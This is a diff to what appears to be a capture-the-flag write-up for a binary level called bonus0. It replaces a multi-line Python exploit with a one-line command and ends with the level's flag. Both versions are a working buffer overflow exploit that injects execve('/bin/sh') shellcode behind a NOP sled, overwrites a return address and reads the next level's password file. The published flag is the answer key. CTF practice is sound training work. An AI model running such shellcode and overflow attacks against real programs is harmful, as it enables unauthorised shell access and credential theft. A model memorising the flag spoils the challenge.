@@ -38,29 +38,7 @@ Stack is RWE (executable) and ASLR is disabled.
 
 ### Exploit Script
 
-```python
-import pty, os, time, subprocess, struct, select
-
-shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
-nop_sled = '\x90' * 200
-env = {'SC': nop_sled + shellcode, 'PATH': '/bin:/usr/bin'}
-
-sc_addr = 0xbfffff73  # middle of NOP sled
-inp1 = 'A' * 20
-inp2 = 'B' * 9 + struct.pack('<I', sc_addr) + 'B' * 7
-
-m, s = pty.openpty()
-proc = subprocess.Popen(['/home/user/bonus0/bonus0'], stdin=s, stdout=s, stderr=s, env=env)
-os.close(s)
-time.sleep(0.3)
-os.write(m, inp1 + '\n')
-time.sleep(0.3)
-os.write(m, inp2 + '\n')
-time.sleep(0.5)
-os.write(m, 'cat /home/user/bonus1/.pass\n')
-time.sleep(1)
-# Read output to get the flag
-```
+SC=$(python -c "print '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'") python -c "import pty,os,time,subprocess,struct; m,s=pty.openpty(); p=subprocess.Popen(['/home/user/bonus0/bonus0'],stdin=s,stdout=s,stderr=s,env={'SC':'\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80','PATH':'/bin:/usr/bin'}); os.close(s); time.sleep(0.3); os.write(m,'A'*20+'\n'); time.sleep(0.3); os.write(m,'B'*9+struct.pack('<I',0xbfffff73)+'B'*7+'\n'); time.sleep(0.5); os.write(m,'cat /home/user/bonus1/.pass\n'); time.sleep(1); print os.read(m,512)"
 
 ### Flag
 `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
